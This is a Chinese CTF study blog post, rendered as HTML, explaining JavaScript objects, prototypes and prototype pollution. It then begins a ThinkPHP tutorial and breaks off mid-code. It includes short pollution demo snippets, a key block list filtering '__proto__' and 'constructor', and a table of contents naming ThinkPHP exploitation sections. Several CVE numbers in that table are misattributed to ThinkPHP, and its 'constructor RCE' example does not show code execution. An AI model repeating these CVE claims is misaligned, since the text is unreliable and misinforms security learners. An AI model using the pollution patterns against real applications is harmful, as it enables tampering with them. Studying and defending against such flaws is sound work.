<li><a href="#12-%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%B1%9E%E6%80%A7%E8%AE%BF%E9%97%AE">1.2 对象的属性访问</a></li>
</ul>
</li>
<li><p><a href="#2-javascript%E4%B8%AD%E7%9A%84%E5%87%BD%E6%95%B0">2. JavaScript中的函数</a></p>
<ul>
<li><a href="#21-%E5%87%BD%E6%95%B0%E5%A3%B0%E6%98%8E%E4%B8%8E%E8%A1%A8%E8%BE%BE%E5%BC%8F">2.1 函数声明与表达式</a></li>
<li><a href="#22-%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0">2.2 箭头函数</a></li>
<li><a href="#23-this-%E5%85%B3%E9%94%AE%E5%AD%97">2.3 <code>this</code> 关键字</a></li>
</ul>
</li>
<li><p><a href="#3-%E5%8E%9F%E5%9E%8B%E4%B8%8E%E7%BB%A7%E6%89%BF">3. 原型与继承</a></p>
<ul>
<li><a href="#31-__proto__-%E5%92%8C-%E5%8E%9F%E5%9E%8B%E9%93%BE">3.1 <code>__proto__</code> 和 原型链</a></li>
<li><a href="#32-constructor">3.2 <code>constructor</code></a></li>
</ul>
</li>
<li><p><a href="#4-%E7%B1%BB%E5%9E%8B%E6%B1%A1%E6%9F%93prototype-pollution">4. 类型污染（Prototype Pollution）</a></p>
<ul>
<li><a href="#41-%E4%BB%80%E4%B9%88%E6%98%AF%E7%B1%BB%E5%9E%8B%E6%B1%A1%E6%9F%93">4.1 什么是类型污染？</a></li>
<li><a href="#42-%E7%B1%BB%E5%9E%8B%E6%B1%A1%E6%9F%93%E7%9A%84%E5%8E%9F%E7%90%86">4.2 类型污染的原理</a></li>
</ul>
</li>
<li><p><a href="#5-__proto__-%E5%92%8C-constructor-%E7%9A%84%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9">5. <code>__proto__</code> 和 <code>constructor</code> 的安全风险</a></p>
<ul>
<li><a href="#51-__proto__-%E6%B3%A8%E5%85%A5">5.1 <code>__proto__</code> 注入</a></li>
<li><a href="#52-constructor-%E5%92%8C-rce%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C">5.2 <code>constructor</code> 和 RCE（远程代码执行）</a></li>
<li><a href="#53-%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD">5.3 防御措施</a></li>
</ul>
</li>
</ul>
<h3 id="1-JavaScript中的对象"><a href="#1-JavaScript中的对象" class="headerlink" title="1. JavaScript中的对象"></a>1. JavaScript中的对象</h3><h4 id="1-1-对象基本概念"><a href="#1-1-对象基本概念" class="headerlink" title="1.1 对象基本概念"></a>1.1 对象基本概念</h4><p>JavaScript中的对象是键值对的集合，用于存储复杂的数据结构。可以通过以下几种方式创建对象：</p>
<ul>
<li><p><strong>对象字面量</strong>:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> person = &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;Alice&quot;</span>,<br>  <span class="hljs-attr">age</span>: <span class="hljs-number">25</span>,<br>  <span class="hljs-attr">greet</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Hello, I am &quot;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>  &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>构造函数创建对象</strong>:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name, age</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;<br>&#125;<br><br><span class="hljs-keyword">let</span> alice = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;Alice&quot;</span>, <span class="hljs-number">25</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(alice.<span class="hljs-property">name</span>);  <span class="hljs-comment">// &quot;Alice&quot;</span><br></code></pre></td></tr></table></figure></li>
</ul>
<h4 id="1-2-对象的属性访问"><a href="#1-2-对象的属性访问" class="headerlink" title="1.2 对象的属性访问"></a>1.2 对象的属性访问</h4><p>可以通过<strong>点记法</strong>或<strong>方括号记法</strong>来访问对象的属性：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person.<span class="hljs-property">name</span>);  <span class="hljs-comment">// 点记法</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person[<span class="hljs-string">&quot;age&quot;</span>]);  <span class="hljs-comment">// 方括号记法</span><br></code></pre></td></tr></table></figure>

<hr>
<h3 id="2-JavaScript中的函数"><a href="#2-JavaScript中的函数" class="headerlink" title="2. JavaScript中的函数"></a>2. JavaScript中的函数</h3><h4 id="2-1-函数声明与表达式"><a href="#2-1-函数声明与表达式" class="headerlink" title="2.1 函数声明与表达式"></a>2.1 函数声明与表达式</h4><p>JavaScript中的函数是第一类对象（First-Class Objects），可以作为变量的值、参数传递或返回值。</p>
<ul>
<li><p><strong>函数声明</strong>:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello, World!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>函数表达式</strong>:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> greet = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello, World!&quot;</span>;<br>&#125;;<br></code></pre></td></tr></table></figure></li>
</ul>
<h4 id="2-2-箭头函数"><a href="#2-2-箭头函数" class="headerlink" title="2.2 箭头函数"></a>2.2 箭头函数</h4><p>箭头函数是简化的函数声明方式，尤其在处理回调和简短函数时非常有用。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> <span class="hljs-title function_">greet</span> = (<span class="hljs-params"></span>) =&gt; <span class="hljs-string">&quot;Hello, World!&quot;</span>;<br></code></pre></td></tr></table></figure>

<h4 id="2-3-this-关键字"><a href="#2-3-this-关键字" class="headerlink" title="2.3 this 关键字"></a>2.3 <code>this</code> 关键字</h4><p>在函数内部，<code>this</code>指向调用该函数的对象。在构造函数中，<code>this</code>指向新创建的实例。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">greet</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Hello, I am &quot;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);<br>  &#125;;<br>&#125;<br><br><span class="hljs-keyword">let</span> alice = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;Alice&quot;</span>);<br>alice.<span class="hljs-title function_">greet</span>();  <span class="hljs-comment">// &quot;Hello, I am Alice&quot;</span><br></code></pre></td></tr></table></figure>

<hr>
<h3 id="3-原型与继承"><a href="#3-原型与继承" class="headerlink" title="3. 原型与继承"></a>3. 原型与继承</h3><p>JavaScript中的对象是通过原型链进行继承的。每个对象都有一个<strong>隐式原型</strong>（<code>[[Prototype]]</code>），可以通过<code>__proto__</code>属性来访问。</p>
<h4 id="3-1-proto-和-原型链"><a href="#3-1-proto-和-原型链" class="headerlink" title="3.1 __proto__ 和 原型链"></a>3.1 <code>__proto__</code> 和 原型链</h4><p><code>__proto__</code>是JavaScript中对象的原型。通过这个原型链，JavaScript能够在一个对象的祖先链中查找属性和方法。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> obj = &#123; <span class="hljs-attr">key</span>: <span class="hljs-string">&quot;value&quot;</span> &#125;;<br><span class="hljs-keyword">let</span> obj2 = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(obj);  <span class="hljs-comment">// 创建一个继承自obj的对象</span><br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj2.<span class="hljs-property">key</span>);  <span class="hljs-comment">// 输出 &quot;value&quot;，因为它继承了obj的属性</span><br></code></pre></td></tr></table></figure>

<p>当访问<code>obj2</code>的<code>key</code>属性时，JavaScript首先在<code>obj2</code>自身查找，如果找不到，则沿着原型链查找<code>obj</code>的属性。</p>
<h4 id="3-2-constructor"><a href="#3-2-constructor" class="headerlink" title="3.2 constructor"></a>3.2 <code>constructor</code></h4><p><code>constructor</code>是每个对象的属性，指向构造该对象的函数。可以通过<code>constructor</code>创建新实例。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) &#123;<br>  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;<br>&#125;<br><br><span class="hljs-keyword">let</span> alice = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;Alice&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(alice.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Person</span>);  <span class="hljs-comment">// true</span><br></code></pre></td></tr></table></figure>

<hr>
<h3 id="4-类型污染（Prototype-Pollution）"><a href="#4-类型污染（Prototype-Pollution）" class="headerlink" title="4. 类型污染（Prototype Pollution）"></a>4. 类型污染（Prototype Pollution）</h3><h4 id="4-1-什么是类型污染？"><a href="#4-1-什么是类型污染？" class="headerlink" title="4.1 什么是类型污染？"></a>4.1 什么是类型污染？</h4><p>类型污染（Prototype Pollution）是一种安全漏洞，攻击者通过修改对象的原型（<code>__proto__</code>）来篡改JavaScript全局对象的行为，从而影响所有继承该原型的对象。这种攻击可以导致权限提升、代码注入等安全问题。</p>
<h4 id="4-2-类型污染的原理"><a href="#4-2-类型污染的原理" class="headerlink" title="4.2 类型污染的原理"></a>4.2 类型污染的原理</h4><p>因为所有对象通过原型链共享相同的原型，当攻击者篡改全局对象的<code>__proto__</code>时，所有基于该原型创建的对象都会继承被篡改的属性或方法。</p>
<p><strong>危险操作示例</strong>:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> obj = &#123;&#125;;<br>obj.<span class="hljs-property">__proto__</span>.<span class="hljs-property">polluted</span> = <span class="hljs-string">&quot;I am polluted!&quot;</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(&#123;&#125;.<span class="hljs-property">polluted</span>);  <span class="hljs-comment">// &quot;I am polluted!&quot;</span><br></code></pre></td></tr></table></figure>

<p>在上例中，攻击者通过修改<code>obj</code>的原型，成功将新的属性<code>polluted</code>注入到了所有对象的原型中。现在，所有新创建的对象都会带有这个“污染”的属性。</p>
<h4 id="4-3-防御类型污染"><a href="#4-3-防御类型污染" class="headerlink" title="4.3 防御类型污染"></a>4.3 防御类型污染</h4><p>为了防御类型污染，应该避免允许用户直接访问或修改<code>__proto__</code>。如果可能，尽量使用<strong>深拷贝</strong>或者使用框架中的安全库来处理对象操作。</p>
<p><strong>防御方法</strong>:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 检查输入是否是直接的对象属性</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">safeSet</span>(<span class="hljs-params">obj, key, value</span>) &#123;<br>  <span class="hljs-keyword">if</span> (key !== <span class="hljs-string">&#x27;__proto__&#x27;</span> &amp;&amp; key !== <span class="hljs-string">&#x27;constructor&#x27;</span> &amp;&amp; key !== <span class="hljs-string">&#x27;prototype&#x27;</span>) &#123;<br>    obj[key] = value;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="5-proto-和-constructor-的安全风险"><a href="#5-proto-和-constructor-的安全风险" class="headerlink" title="5. __proto__ 和 constructor 的安全风险"></a>5. <code>__proto__</code> 和 <code>constructor</code> 的安全风险</h3><h4 id="5-1-proto-注入"><a href="#5-1-proto-注入" class="headerlink" title="5.1 __proto__ 注入"></a>5.1 <code>__proto__</code> 注入</h4><p>当不安全地操作<code>__proto__</code>时，攻击者可以通过类型污染来引入恶意属性或方法，造成潜在的安全风险。</p>
<p><strong>示例：利用<code>__proto__</code>修改全局行为</strong>:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> obj = &#123;&#125;;<br>obj.<span class="hljs-property">__proto__</span>.<span class="hljs-property">toString</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;This is hacked!&quot;</span>;<br>&#125;;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(&#123;&#125;.<span class="hljs-title function_">toString</span>());  <span class="hljs-comment">// &quot;This is hacked!&quot;</span><br></code></pre></td></tr></table></figure>

<h4 id="5-2-constructor-和-RCE（远程代码执行）"><a href="#5-2-constructor-和-RCE（远程代码执行）" class="headerlink" title="5.2 constructor 和 RCE（远程代码执行）"></a>5.2 <code>constructor</code> 和 RCE（远程代码执行）</h4><p><code>constructor</code>也是一个容易被滥用的对象属性。如果攻击者能够控制<code>constructor</code>，可能会注入恶意代码导致RCE。</p>
<p><strong>危险操作示例</strong>:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> obj = &#123;&#125;;<br>obj.<span class="hljs-property">__proto__</span>.<span class="hljs-property">constructor</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;alert(&quot;RCE via constructor!&quot;)&#x27;</span>);<br>&#125;;<br><br><span class="hljs-keyword">let</span> x = <span class="hljs-keyword">new</span> obj.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>);  <span class="hljs-comment">// 触发恶意代码执行</span><br></code></pre></td></tr></table></figure>

<h4 id="5-3-防御措施"><a href="#5-3-防御措施" class="headerlink" title="5.3 防御措施"></a>5.3 防御措施</h4><ul>
<li><strong>严格限制用户输入</strong>: 检查和过滤用户输入，防止直接操作<code>__proto__</code>或<code>constructor</code>。</li>
<li><strong>冻结对象原型</strong>: 使用<code>Object.freeze()</code>或<code>Object.seal()</code>来防止对象的原型被修改。<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">freeze</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);<br></code></pre></td></tr></table></figure></li>
<li><strong>使用安全的对象操作方法</strong>: 避免直接使用<code>__proto__</code>，改用<code>Object.create()</code>等安全的方式创建对象。</li>
</ul>
<hr>
<h3 id="6-总结"><a href="#6-总结" class="headerlink" title="6. 总结"></a>6. 总结</h3><p>JavaScript中的对象、函数、<code>__proto__</code>与<code>constructor</code>机制在CTF和Web安全中扮演着重要角色。CTF选手应当熟悉这些概念，特别是类型污染、原型链的攻击与防御技巧，以应对Web题中常见的安全挑战。</p>
<h4 id="关键点回顾："><a href="#关键点回顾：" class="headerlink" title="关键点回顾："></a>关键点回顾：</h4><ul>
<li><p>JavaScript中的对象和函数是基于原型链的，这为类型污染攻击提供了可能。</p>
</li>
<li><p><code>__proto__</code>是访问和修改对象原型的入口，容易被滥用。</p>
</li>
<li><p><code>constructor</code>不仅用于对象构造，还可能被滥用执行恶意代码。</p>
</li>
<li><p>防御类型污染的关键在于输入验证、冻结原型、以及使用安全的对象操作方法。</p>
</li>
</ul>
<h1 id="3-PHP-框架-ThinkPHP"><a href="#3-PHP-框架-ThinkPHP" class="headerlink" title="3. PHP 框架 - ThinkPHP"></a><strong>3. PHP</strong> <strong>框架 - ThinkPHP</strong></h1><h3 id="ThinkPHP-快速入门与完整指南"><a href="#ThinkPHP-快速入门与完整指南" class="headerlink" title="ThinkPHP 快速入门与完整指南"></a>ThinkPHP 快速入门与完整指南</h3><p>本指南将从项目的目录结构开始，涵盖从控制器、路由、数据库操作、视图渲染、表单验证、错误处理、日志记录等常见功能的使用，最后会介绍项目的部署与配置。</p>
<hr>
<h3 id="目录-2"><a href="#目录-2" class="headerlink" title="目录"></a>目录</h3><ol>
<li><p><a href="#%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84">目录结构</a></p>
</li>
<li><p><a href="#%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8">快速入门</a></p>
<ul>
<li><a href="#%E5%88%9B%E5%BB%BA%E6%8E%A7%E5%88%B6%E5%99%A8">创建控制器</a></li>
<li><a href="#%E9%85%8D%E7%BD%AE%E8%B7%AF%E7%94%B1">配置路由</a></li>
<li><a href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C">数据库操作</a></li>
</ul>
</li>
<li><p><a href="#%E9%85%8D%E7%BD%AE%E6%95%B0%E6%8D%AE%E5%BA%93">配置数据库</a></p>
<ul>
<li><a href="#%E5%88%9B%E5%BB%BA%E6%A8%A1%E5%9E%8B">创建模型</a></li>
</ul>
</li>
<li><p><a href="#%E8%A7%86%E5%9B%BE%E5%92%8C%E6%A8%A1%E6%9D%BF">视图和模板</a></p>
<ul>
<li><a href="#%E5%88%9B%E5%BB%BA%E8%A7%86%E5%9B%BE%E6%96%87%E4%BB%B6">创建视图文件</a></li>
<li><a href="#%E6%B8%B2%E6%9F%93%E8%A7%86%E5%9B%BE">渲染视图</a></li>
</ul>
</li>
<li><p><a href="#%E8%A1%A8%E5%8D%95%E9%AA%8C%E8%AF%81">表单验证</a></p>
<ul>
<li><a href="#%E5%88%9B%E5%BB%BA%E9%AA%8C%E8%AF%81%E5%99%A8">创建验证器</a></li>
<li><a href="#%E4%BD%BF%E7%94%A8%E9%AA%8C%E8%AF%81%E5%99%A8">使用验证器</a></li>
</ul>
</li>
<li><p><a href="#%E9%94%99%E8%AF%AF%E5%92%8C%E6%97%A5%E5%BF%97">错误和日志</a></p>
<ul>
<li><a href="#%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86">错误处理</a></li>
<li><a href="#%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95">日志记录</a></li>
</ul>
</li>
<li><p><a href="#%E9%83%A8%E7%BD%B2">部署</a></p>
<ul>
<li><a href="#%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83">配置环境</a></li>
<li><a href="#%E9%85%8D%E7%BD%AE-web-%E6%9C%8D%E5%8A%A1%E5%99%A8">配置 Web 服务器</a></li>
</ul>
</li>
<li><p><a href="#thinkphp-%E6%A1%86%E6%9E%B6%E6%9E%B6%E6%9E%84%E4%B8%8E%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5">ThinkPHP 框架架构与基础概念</a></p>
<ul>
<li><a href="#%E8%B7%AF%E7%94%B1%E6%9C%BA%E5%88%B6">1. 路由机制</a></li>
</ul>
<p>	</p>
</li>
<li><p><a href="#thinkphp-%E5%B8%B8%E8%A7%81%E7%9A%84%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E">ThinkPHP 常见的安全漏洞</a></p>
<ul>
<li><a href="#sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E">1. SQL 注入漏洞</a>  </li>
<li><a href="#%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E">2. 路径遍历漏洞</a>   </li>
<li><a href="#%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8Crce">3. 远程代码执行（RCE）</a>  </li>
<li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">4. 反序列化漏洞</a></li>
</ul>
</li>
<li><p><a href="#thinkphp-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95">ThinkPHP 漏洞利用方法</a></p>
<ul>
<li><p><a href="#sql-%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB">1. SQL 注入攻击</a>   </p>
</li>
<li><p><a href="#%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%94%BB%E5%87%BB">2. 远程代码执行攻击</a>   </p>
</li>
<li><p><a href="#%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%94%BB%E5%87%BB">3. 路径遍历攻击</a>   </p>
</li>
<li><p><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB">4. 反序列化攻击</a></p>
</li>
</ul>
</li>
<li><p><a href="#thinkphp-%E5%AE%89%E5%85%A8%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD">ThinkPHP 安全防御措施</a></p>
</li>
<li><p><a href="#%E7%89%88%E6%9C%AC%E5%8E%86%E5%8F%B2%E4%B8%8E%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93">版本历史与漏洞总结</a></p>
</li>
<li><p><a href="#ctf-%E9%A2%98%E7%9B%AE%E4%B8%AD%E7%9A%84-thinkphp-%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93">CTF 题目中的 ThinkPHP 漏洞总结</a></p>
<ul>
<li><p><a href="#cve-2018-20062---thinkphp-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E">1. <strong>CVE-2018-20062</strong> - ThinkPHP 远程代码执行漏洞</a>  </p>
</li>
<li><p><a href="#cve-2019-9082---thinkphp-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E">2. <strong>CVE-2019-9082</strong> - ThinkPHP 远程代码执行漏洞</a>   </p>
</li>
<li><p><a href="#cve-2018-19518---thinkphp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E">3. <strong>CVE-2018-19518</strong> - ThinkPHP 反序列化远程代码执行漏洞</a>  </p>
</li>
<li><p><a href="#cve-2018-1000861---thinkphp-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E">4. <strong>CVE-2018-1000861</strong> - ThinkPHP 模板注入漏洞</a>   </p>
</li>
<li><p><a href="#cve-2019-8018---thinkphp-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E">5. <strong>CVE-2019-8018</strong> - ThinkPHP SQL 注入漏洞</a>   </p>
</li>
<li><p><a href="#cve-2019-7481---thinkphp-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E">6. <strong>CVE-2019-7481</strong> - ThinkPHP 后台文件上传漏洞</a></p>
</li>
</ul>
</li>
</ol>
<hr>
<h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><p>ThinkPHP 的标准项目目录结构如下：</p>
<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs axapta">application/            <span class="hljs-meta"># 应用目录，包含控制器、模型、视图等</span><br>├── controller/         <span class="hljs-meta"># 控制器目录</span><br>├── model/              <span class="hljs-meta"># 模型目录</span><br>├── view/               <span class="hljs-meta"># 视图目录</span><br>├── <span class="hljs-keyword">common</span>/             <span class="hljs-meta"># 公共目录，存放公共类、函数等</span><br>├── config/             <span class="hljs-meta"># 配置文件目录</span><br>├── route/              <span class="hljs-meta"># 路由配置目录</span><br><span class="hljs-keyword">public</span>/                 <span class="hljs-meta"># Web 公开目录，包含入口文件</span><br>vendor/                 <span class="hljs-meta"># 第三方依赖库（通过 Composer 管理）</span><br>runtime/                <span class="hljs-meta"># 缓存、日志等临时文件目录</span><br>thinkphp/               <span class="hljs-meta"># ThinkPHP 核心框架目录</span><br></code></pre></td></tr></table></figure>

<ul>
<li>**application&#x2F;**：存放应用逻辑，如控制器、模型、视图等。</li>
<li>**public&#x2F;**：存放项目的入口文件（如 <code>index.php</code>）和公开资源。</li>
<li>**runtime&#x2F;**：用于存放日志、缓存等临时文件。</li>
<li>**vendor&#x2F;**：使用 Composer 管理的第三方库。</li>
<li>**thinkphp&#x2F;**：ThinkPHP 框架的核心代码。</li>
</ul>
<hr>
<h3 id="快速入门"><a href="#快速入门" class="headerlink" title="快速入门"></a>快速入门</h3><h4 id="创建控制器"><a href="#创建控制器" class="headerlink" title="创建控制器"></a>创建控制器</h4><p><strong>控制器</strong> 是 ThinkPHP 处理用户请求的核心部分，负责业务逻辑的处理。控制器文件位于 <code>application/controller/</code> 目录中。</p>
<ol>
<li>在 <code>application/controller/</code> 目录下创建控制器文件 <code>Index.php</code>：</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> application/controller/Index.php<br></code></pre></td></tr></table></figure>

<ol start="2">
<li>在控制器文件中编写基本代码：</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">controller</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Controller</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello, ThinkPHP!&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hello</span>(<span class="hljs-params"><span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;World&#x27;</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello, 